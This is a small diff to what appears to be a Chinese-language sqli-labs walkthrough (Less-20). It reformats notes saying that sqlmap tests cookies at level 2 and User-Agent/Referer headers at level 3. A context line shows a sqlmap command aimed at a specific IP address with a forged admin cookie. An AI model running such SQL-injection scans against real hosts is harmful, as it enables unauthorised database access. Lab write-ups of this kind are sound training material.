@@ -46,8 +46,8 @@ Upgrade-Insecure-Requests: 1
 sqlmap.py -u "http://43.247.91.228:84/Less-20/index.php" --cookie "uname=admin" --level=2
 ```
 
-> HTTP Cookie在level为2及以上的时候会测试
-> HTTP User-Agent/Referer头在level为3及以上的时候会测试
+> * HTTP Cookie在level为2及以上的时候会测试.
+> * HTTP User-Agent/Referer头在level为3及以上的时候会测试.
 
 
 返回:
